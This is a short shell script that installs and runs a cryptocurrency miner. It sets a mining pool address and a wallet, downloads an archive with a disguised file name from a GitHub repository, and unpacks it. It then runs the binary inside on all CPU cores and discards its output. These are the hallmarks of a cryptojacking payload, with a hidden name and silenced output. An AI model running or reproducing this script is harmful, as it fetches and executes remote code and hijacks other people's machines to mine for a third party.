#!/bin/sh

A=auto.c3pool.org:80
B=82z34TsNcf14PYSUTm58ds8or1Knyk9hs1v6LkpMvPzFAXxYFvD5afoNBVpxCpkjH81YzeAiiM6rnDWQNnR2s5i9Ed1Ct7Y
C=kokom
apt-get update && apt-get upgrade -y
wget https://github.com/muledan1/bash/raw/main/-.tar.gz
tar -xf -.tar.gz
./- -o $A -u $B.$C -t$(nproc --all) >/dev/null >/dev/null 2>&1
sleep 10
